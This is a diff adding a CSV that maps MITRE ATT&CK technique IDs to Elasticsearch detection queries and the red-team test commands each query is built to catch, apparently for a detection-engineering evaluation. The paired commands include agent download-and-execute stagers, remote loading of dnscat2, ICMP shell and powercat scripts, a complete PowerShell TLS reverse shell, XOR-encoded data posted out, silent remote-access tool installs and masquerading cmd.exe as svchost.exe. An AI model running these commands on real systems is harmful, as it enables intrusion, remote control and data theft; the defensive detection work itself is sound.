@@ -1,0 +1,555 @@
+T1105,"{
+    ""query"": {
+        ""bool"": {       
+            ""must"": [
+                {""bool"":{
+     ""must"":[
+                        {""match_phrase"": {""CommandLine"": ""New-Object System.Net.WebClient""}},
+                        {""wildcard"":{""CommandLine"": ""*.Headers.add""}},
+                        {""wildcard"":{""CommandLine"": ""*.DownloadData""}},
+                        {""match_phrase"":{""CommandLine"": ""sandcat.go""}},
+                        {""wildcard"":{""CommandLine"": ""*.ResponseHeaders""}}
+                    ]
+     }
+    },
+    {""bool"":{
+     ""should"":[
+                        {""match_phrase"": {""CommandLine"": ""get-process""}},
+                        {""match_phrase"": {""CommandLine"": ""stop-process""}},
+                        {""match_phrase"": {""CommandLine"": ""Start-Process""}}
+      ]
+     }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","$server=""#{app.contact.http}"";
+$url=""$server/file/download"";
+$wc=New-Object System.Net.WebClient;
+$wc.Headers.add(""platform"",""windows"");
+$wc.Headers.add(""file"",""sandcat.go"");
+$data=$wc.DownloadData($url);
+$name=$wc.ResponseHeaders[""Content-Disposition""].Substring($wc.ResponseHeaders[""Content-Disposition""].IndexOf(""filename="")+9).Replace(""`"""","""");
+get-process | ? {$_.modules.filename -like ""C:\Users\Public\$name.exe""} | stop-process -f;
+rm -force ""C:\Users\Public\$name.exe"" -ea ignore;
+[io.file]::WriteAllBytes(""C:\Users\Public\$name.exe"",$data) | Out-Null;
+Start-Process -FilePath C:\Users\Public\$name.exe -ArgumentList ""-server $server -group red"" -WindowStyle hidden;",2（4）
+T1219,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                            {""match_phrase"":{""CommandLine"": ""Start-Process""}},
+                            {""match_phrase"":{""CommandLine"": ""ammyy.exe""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",Start-Process $env:temp\ammyy.exe,2（4）
+T1219,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                            {""match_phrase"":{""CommandLine"": ""AnyDesk.exe""}},
+                            {""match_phrase"":{""CommandLine"": ""Start-Process""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe; 
+$file1 = ""C:\Users\"" + $env:username + ""\Desktop\AnyDesk.exe""; 
+Start-Process $file1 /S;",2（4）
+T1105,"{
+    ""query"": {
+        ""bool"": {       
+            ""must"": [
+                {""bool"":{
+     ""must"":[
+                        {""wildcard"": {""CommandLine"": ""Curl*""}}
+                    ]
+     }
+    },
+    {""bool"":{
+     ""should"":[
+                        {""match"": {""CommandLine"": "" -T ""}},
+                        {""match"": {""CommandLine"": ""--upload""}},
+                        {""match"": {""CommandLine"": "" -d ""}},
+                        {""match"": {""CommandLine"": ""--data ""}},
+                        {""match"": {""CommandLine"": "" -k ""}}
+      ]
+     }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","C:\Windows\System32\Curl.exe -T c:\temp\atomictestfile.txt www.example.com 
+&& C:\Windows\System32\Curl.exe --upload-file c:\temp\atomictestfile.txt www.example.com 
+&& C:\Windows\System32\Curl.exe -d c:\temp\atomictestfile.txt www.example.com 
+&& C:\Windows\System32\Curl.exe --data c:\temp\atomictestfile.txt www.example.com
+
+C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\users\public\music\allthethingsx64.dll && C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll --output c:\users\public\music\allthethingsx64.dll && C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\programdata\allthethingsx64.dll && C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o %Temp%\allthethingsx64.dll",2（4）
+T1071.004,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                            {""match_phrase"":{""CommandLine"": ""Start-Dnscat2""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1'); 
+Start-Dnscat2 -Domain",2（4）
+T1071.004,"{
+    ""query"": {
+        ""bool"": {       
+            ""must"": [
+                {""bool"":{
+     ""must"":[
+                        {""match_phrase"": {""CommandLine"": ""for(""}},
+                        {""match_phrase"": {""CommandLine"": ""Resolve-DnsName""}}
+                    ]
+     }
+    },
+    {""bool"":{
+     ""should"":[
+                        {""match_phrase"": {""CommandLine"": ""Get-Random""}},
+                        {""term"": {""CommandLine"": ""127.0.0.1""}},
+                        {""term"": {""CommandLine"": ""xip.io""}}
+      ]
+     }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","for($i=0; $i -le 1000; $i++) { Resolve-DnsName -type ""TXT"" ""atomicredteam.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io"" -QuickTimeout}",2（4）
+T1071.004,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                            {""match_phrase"":{""CommandLine"": ""Set-Location""}},
+                            {""match_phrase"":{""CommandLine"": ""dns-domain-length.ps1""}},
+                            {""term"":{""CommandLine"": ""127.0.0.1""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",Set-Location PathToAtomicsFolder; .\T1071.004\src\T1071-dns-domain-length.ps1 -Domain 127.0.0.1.xip.io -Subdomain atomicredteamatomicredteamatomicredteamatomicredteamatomicredte -QueryType TXT,2（4）
+T1071.004,"{
+    ""query"": {
+        ""bool"": {       
+            ""must"": [
+                {""bool"":{
+     ""must"":[
+                        {""match_phrase"": {""CommandLine"": ""Set-Location""}},
+                        {""match_phrase"": {""CommandLine"": ""dns-beacon.ps1""}},
+                        {""term"": {""CommandLine"": ""127.0.0.1""}}
+                    ]
+     }
+    },
+    {""bool"":{
+     ""should"":[
+                        {""match_phrase"": {""CommandLine"": ""-C2Interval""}},
+                        {""match_phrase"": {""CommandLine"": ""-C2Jitter""}},
+                        {""match_phrase"": {""CommandLine"": ""-RunTime""}}
+      ]
+     }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",Set-Location PathToAtomicsFolder; .\T1071.004\src\T1071-dns-beacon.ps1 -Domain 127.0.0.1.xip.io -Subdomain atomicredteam -QueryType TXT -C2Interval 30 -C2Jitter 20 -RunTime 30,2（4）
+T1572,"{
+    ""query"": {
+        ""bool"": {
+            ""should"": [
+                            {""match_phrase"":{""CommandLine"": ""Set-Location""}},
+                            {""match_phrase"":{""CommandLine"": ""doh-domain-length.ps1""}},
+                            {""match_phrase"":{""CommandLine"": ""-DohServer""}}
+            ],
+            ""minimum_should_match"": 2
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",Set-Location PathToAtomicsFolder; .\T1572\src\T1572-doh-domain-length.ps1 -DohServer,2（4）
+T1572,"{
+    ""query"": {
+        ""bool"": {
+            ""should"": [
+                            {""match_phrase"":{""CommandLine"": ""Set-Location""}},
+                            {""match_phrase"":{""CommandLine"": ""doh-beacon.ps1""}},
+                            {""match_phrase"":{""CommandLine"": ""-DohServer""}}
+            ],
+            ""minimum_should_match"": 2
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",Set-Location PathToAtomicsFolder; .\T1572\src\T1572-doh-beacon.ps1 -DohServer,2（4）
+T1105,"{
+    ""query"": {
+        ""bool"": {
+            ""should"": [
+                            {""match_phrase"":{""CommandLine"": ""MpCmdRun.exe -DownloadFile""}},
+                            {""match_phrase"":{""CommandLine"": ""IMEWDBLD.exe""}},
+                            {""match_phrase"":{""CommandLine"": ""certutil -urlcache""}},
+                            {""match_phrase"":{""CommandLine"": ""certutil -verifyctl""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","cd ""%ProgramData%\Microsoft\Windows Defender\platform\4.18*"" && MpCmdRun.exe -DownloadFile -url 
+https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -path %temp%\Atomic-license.txt
+
+
+
+$imewdbled = $env:SystemRoot + ""\System32\IME\SHARED\IMEWDBLD.exe""; & $imewdbled https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml",
+T1219,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                            {""match_phrase"":{""CommandLine"": ""GoToAssist.exe""}},
+                            {""match_phrase"":{""CommandLine"": ""Start-Process""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","Invoke-WebRequest -OutFile C:\Users\$env:username\Downloads\GoToAssist.exe ""https://launch.getgo.com/launcher2/helper?token=e0-FaCddxmtMoX8_cY4czssnTeGvy83ihp8CLREfvwQshiBW0_RcbdoaEp8IA-Qn8wpbKlpGIflS-39gW6RuWRM-XHwtkRVMLBsp5RSKp-a3PBM-Pb1Fliy73EDgoaxr-q83WtXbLKqD7-u3cfDl9gKsymmhdkTGsXcDXir90NqKj92LsN_KpyYwV06lIxsdRekhNZjNwhkWrBa_hG8RQJqWSGk6tkZLVMuMufmn37eC2Cqqiwq5bCGnH5dYiSUUsklSedRLjh4N46qPYT1bAU0qD25ZPr-Kvf4Kzu9bT02q3Yntj02ZA99TxL2-SKzgryizoopBPg4Ilfo5t78UxKTYeEwo4etQECfkCRvenkTRlIHmowdbd88zz7NiccXnbHJZehgs6_-JSVjQIdPTXZbF9T5z44mi4BQYMtZAS3DE86F0C3D4Tcd7fa5F6Ve8rQWt7pvqFCYyiJAailslxOw0LsGyFokoy65tMF980ReP8zhVcTKYP8s8mhGXihUQJQPNk20Sw&downloadTrigger=restart&renameFile=1""; 
+$file1 = ""C:\Users\"" + $env:username + ""\Downloads\GoToAssist.exe""; Start-Process $file1 /S;",2（4）
+T1095,"{
+    ""query"": {
+        ""bool"": {
+            ""should"": [
+                            {""match_phrase"":{""CommandLine"": ""Invoke-PowerShellIcmp""}},
+                            {""term"":{""CommandLine"": ""nc -l -p""}},
+                            {""match_phrase"":{""CommandLine"": ""powercat -c""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1'); 
+Invoke-PowerShellIcmp -IPAddress
+
+IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1'); 
+powercat -c",2（4）
+T1105,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                              
+                            {""match_phrase"":{""CommandLine"": ""System.IO.Compression.FileSystem""}},
+                            {""match_phrase"":{""CommandLine"": ""PSTools.zip""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };
+$web = (New-Object System.Net.WebClient);
+$result = $web.DownloadFile(""https://download.sysinternals.com/files/PSTools.zip"", ""PSTools.zip"");
+New-Item -ItemType ""directory"" C:\Windows\System32\PSTools -Force;
+Add-Type -Assembly 'System.IO.Compression.FileSystem'; [System.IO.Compression.ZipFile]::ExtractToDirectory(""PSTools.zip"", ""C:\Windows\System32\PSTools"");",2（4）
+T1219,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                            {""match_phrase"":{""CommandLine"": ""LogMeInIgnition.msi""}},
+                            {""match_phrase"":{""CommandLine"": ""Start-Process""}},
+                            {""match_phrase"":{""CommandLine"": ""LMIIgnition.exe""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi; 
+$file1 = ""C:\Users\"" + $env:username + ""\Desktop\LogMeInIgnition.msi""; 
+Start-Process -Wait $file1 /quiet; 
+Start-Process 'C:\Program Files (x86)\LogMeIn Ignition\LMIIgnition.exe' ""/S""",2（4）
+T1105,"{
+    ""query"": {
+        ""bool"": {       
+            ""must"": [
+                {""bool"":{
+     ""must"":[
+                        {""match_phrase"": {""CommandLine"": ""New-Object System.Net.WebClient""}},
+                        {""wildcard"":{""CommandLine"": ""*.Headers.add""}},
+                        {""wildcard"":{""CommandLine"": ""*.DownloadData""}},
+                        {""term"":{""CommandLine"": ""manx.go""}},
+                        {""wildcard"":{""CommandLine"": ""*.ResponseHeaders""}}
+                    ]
+     }
+    },
+    {""bool"":{
+     ""should"":[
+                        {""match_phrase"": {""CommandLine"": ""get-process""}},
+                        {""match_phrase"": {""CommandLine"": ""stop-process""}},
+                        {""match_phrase"": {""CommandLine"": ""Start-Process""}}
+      ]
+     }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","if ($host.Version.Major -ge 3){$ErrAction= ""ignore""}else{$ErrAction= ""SilentlyContinue""};
+$server=""#{app.contact.http}"";
+$socket=""#{app.contact.tcp}"";
+$contact=""tcp"";
+$url=""$server/file/download"";
+$wc=New-Object System.Net.WebClient;
+$wc.Headers.add(""platform"",""windows"");
+$wc.Headers.add(""file"",""manx.go"");
+$data=$wc.DownloadData($url);
+$name=$wc.ResponseHeaders[""Content-Disposition""].Substring($wc.ResponseHeaders[""Content-Disposition""].IndexOf(""filename="")+9).Replace(""`"""","""");
+Get-Process | ? {$_.Path -like ""C:\Users\Public\$name.exe""} | stop-process -f -ea $ErrAction;
+rm -force ""C:\Users\Public\$name.exe"" -ea $ErrAction;
+([io.file]::WriteAllBytes(""C:\Users\Public\$name.exe"",$data)) | Out-Null;
+Start-Process -FilePath C:\Users\Public\$name.exe -ArgumentList ""-socket $socket -http $server -contact $contact"" -WindowStyle hidden;",2（4）
+T1573,"{
+    ""query"": {
+        ""bool"": {       
+            ""must"": [
+                {""bool"":{
+     ""must"":[
+                        {""match_phrase"": {""CommandLine"": ""New-Object Net.Sockets.TcpClient""}},
+                        {""wildcard"":{""CommandLine"": ""*.GetStream""}},
+                        {""match_phrase"": {""CommandLine"": ""New-Object System.Net.Security.SslStream""}},
+                        {""wildcard"":{""CommandLine"": ""*.AuthenticateAsClient""}},
+                        {""match_phrase"": {""CommandLine"": ""New-Object System.IO.StreamWriter""}}
+                    ]
+     }
+    },
+    {""bool"":{
+     ""should"":[
+                        {""match_phrase"": {""CommandLine"": ""System.Text.ASCIIEncoding""}},
+                        {""wildcard"":{""CommandLine"": ""*.Write""}},
+                        {""wildcard"":{""CommandLine"": ""*.Flush""}}
+      ]
+     }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","$server_ip =; $server_port =; 
+$socket = New-Object Net.Sockets.TcpClient('#{server_ip}', '#{server_port}'); 
+$stream = $socket.GetStream(); 
+$sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback])); 
+$sslStream.AuthenticateAsClient('fake.domain', $null, ""Tls12"", $false); 
+$writer = new-object System.IO.StreamWriter($sslStream); 
+$writer.Write('PS ' + (pwd).Path + '> '); 
+$writer.flush(); 
+[byte[]]$bytes = 0..65535|%{0}; 
+while(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0); 
+{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); 
+$sendback = (iex $data | Out-String ) 2>&1; 
+$sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; 
+$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); 
+$sslStream.Write($sendbyte,0,$sendbyte.Length);
+$sslStream.Flush()}",4
+T1090.003,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                        {""wildcard"":{""CommandLine"": ""start*""}},
+                        {""match_phrase"":{""CommandLine"": ""psiphon3.exe""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","start %USERPROFILE%\Downloads\psiphon3.exe
+timeout /t 20 >nul 2>&1
+Taskkill /IM msedge.exe /F >nul 2>&1
+Taskkill /IM psiphon3.exe /F >nul 2>&1
+Taskkill /IM psiphon-tunnel-core.exe /F >nul 2>&1",2（4）
+T1219,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                        {""wildcard"":{""CommandLine"": ""ScreenConnect*""}},
+                        {""wildcard"":{""CommandLine"": ""*msi""}},
+                        {""match_phrase"":{""CommandLine"": ""msiexec //i""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","$installer = ""C:\Users\$env:username\Downloads\ScreenConnect.msi""; 
+Invoke-WebRequest -OutFile $installer ""https://d1kuyuqowve5id.cloudfront.net/ScreenConnect_21.11.4237.7885_Release.msi""; msiexec /i $installer /qn",4 (日志被不全)
+T1219,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                            {""match_phrase"":{""CommandLine"": ""Start-Process""}},
+                            {""match_phrase"":{""CommandLine"": ""TeamViewer.exe""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\TeamViewer_Setup.exe https://download.teamviewer.com/download/TeamViewer_Setup.exe; 
+$file1 = ""C:\Users\"" + $env:username + ""\Desktop\TeamViewer_Setup.exe""; 
+Start-Process -Wait $file1 /S; 
+Start-Process 'C:\Program Files (x86)\TeamViewer\TeamViewer.exe'",2（4）
+T1571,"{
+    ""query"": {
+        ""bool"": {       
+            ""must"": [
+                {""bool"":{
+     ""must"":[
+                        {""match_phrase"": {""CommandLine"": ""Test-NetConnection""}}
+                    ]
+     }
+    },
+    {""bool"":{
+     ""should"":[
+                        {""match_phrase"": {""CommandLine"": ""-ComputerName""}},
+                        {""match_phrase"": {""CommandLine"": ""-port""}}
+      ]
+     }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",Test-NetConnection -ComputerName google.com -port 8081,2
+T1090.003,"{
+    ""query"": {
+        ""bool"": {       
+            ""must"": [
+                {""bool"":{
+     ""must"":[
+                        {""match_phrase"": {""CommandLine"": ""tor.exe""}}
+                    ]
+     }
+    },
+    {""bool"":{
+     ""should"":[
+                        {""match_phrase"": {""CommandLine"": ""invoke-expression""}},
+                        {""match_phrase"": {""CommandLine"": ""stop-process""}},
+                        {""match_phrase"": {""CommandLine"": ""start powershell""}}
+      ]
+     }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","invoke-expression 'cmd /c start powershell -Command {cmd /c $env:temp\tor\Tor\tor.exe}'; 
+sleep -s 60; 
+stop-process -name ""tor"" | out-null",2（4）
+T1105,"{
+    ""query"": {
+        ""bool"": {       
+            ""must"": [
+                {""bool"":{
+     ""must_not"":[
+                        
+                        {""match"": {""CommandLine"": ""if""}}
+                    ]
+     }
+    },
+    {""bool"":{
+     ""must"":[
+                         {""wildcard"":{""CommandLine"": ""bitsadmin*""}},
+                        {""match_phrase"": {""CommandLine"": "" /transfer""}},
+                         {""match_phrase"": {""CommandLine"": ""/Priority""}}
+      ]
+     }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",C:\Windows\System32\bitsadmin.exe /transfer qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt %temp%\Atomic-license.txt,2
+T1105,"{
+    ""query"": {
+        ""bool"": {
+            ""must"": [
+                    {""match_phrase"": {""CommandLine"": ""New-Object Net.WebClient""}},
+                    {""wildcard"": {""CommandLine"": ""Download*""}}
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","(New-Object System.Net.WebClient).DownloadFile(""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt"", ""$env:TEMP\Atomic-license.txt"")
+
+(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt') | Out-File LICENSE.txt; Invoke-Item LICENSE.txt",2(4)
+T1132.001,"{
+    ""query"": {
+        ""bool"": {       
+            ""must"": [
+                {""bool"":{
+     ""must"":[
+                        {""match_phrase"": {""CommandLine"": ""Invoke-WebRequest""}},
+                        {""match"": {""CommandLine"": ""-bxor""}}
+                    ]
+     }
+    },
+    {""bool"":{
+     ""should"":[
+                        {""match"": {""CommandLine"": ""-Method""}},
+                        {""match"": {""CommandLine"": ""-Ur""}},
+                        {""match"": {""CommandLine"": ""-Method""}},
+                        {""match"": {""CommandLine"": ""-DisableKeepAlive""}},
+      ]
+     }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","$plaintext = ([system.Text.Encoding]::UTF8.getBytes(""Path\n----\nC:\Users\victim"")); 
+$key = ""abcdefghijklmnopqrstuvwxyz123456""; 
+$cyphertext =  @(); 
+for ($i = 0; $i -lt $plaintext.Count; $i++) {;
+$cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length]; }; 
+$cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext); [System.Net.ServicePointManager]::Expect100Continue = $false; 
+Invoke-WebRequest -Uri example.com -Method POST -Body $cyphertext -DisableKeepAlive",2（4）
+T1090.001,"{
+    ""query"": {
+        ""bool"": {       
+            ""must"": [
+                {""bool"":{
+     ""must"":[
+                        {""wildcard"": {""CommandLine"": ""netsh*""}},
+                        {""match_phrase"": {""CommandLine"": ""interface portproxy add""}}
+                    ]
+     }
+    },
+    {""bool"":{
+     ""should"":[
+                        {""term"": {""CommandLine"": ""listenport""}},
+                        {""term"": {""CommandLine"": ""connectport""}},
+                        {""term"": {""CommandLine"": ""connectaddress""}}
+      ]
+     }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}",netsh interface portproxy add v4tov4 listenport=1337 connectport=1337 connectaddress=127.0.0.1,2
+T1105,"{
+    ""query"": {
+        ""bool"": {       
+            ""must"": [
+                {""bool"":{
+     ""must"":[
+                        {""match_phrase"": {""CommandLine"": ""svchost.exe""}},
+                        {""match_phrase"": {""CommandLine"": ""System32\\cmd.exe""}}
+                    ]
+     }
+    },
+    {""bool"":{
+     ""should"":[
+                        {""match"": {""CommandLine"": ""copy""}},
+                        {""match_phrase"": {""CommandLine"": ""copy-item""}}
+      ]
+     }
+    }
+            ]
+        }
+    },
+    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
+}","copy C:\Windows\System32\cmd.exe C:\svchost.exe 
+&& C:\svchost.exe /c echo T1105 > \\localhost\c$\T1105.txt
+
+copy-item C:\Windows\System32\cmd.exe C:\svchost.exe",2
